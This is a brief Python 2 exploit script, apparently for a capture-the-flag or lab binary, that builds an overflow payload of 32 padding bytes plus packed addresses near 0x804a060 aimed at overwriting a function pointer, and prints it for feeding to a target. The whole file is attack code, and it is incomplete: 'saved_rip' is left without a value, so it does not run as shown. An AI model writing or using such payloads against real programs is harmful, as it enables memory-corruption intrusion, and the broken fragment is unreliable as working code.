import struct 

sc_addr = 0x804a060

saved_rip = 

func_pointer = 0x804a020  # func - 12

payload = 'A' * 32 +  struct.pack('<i', sc_addr - 4) + struct.pack('<i', sc_addr + 4) 

sc = struct.pack('<i', saved_rip) + struct.pack('<i', sc_addr)

print sc

print "abcd"

print "abcd"

print payload

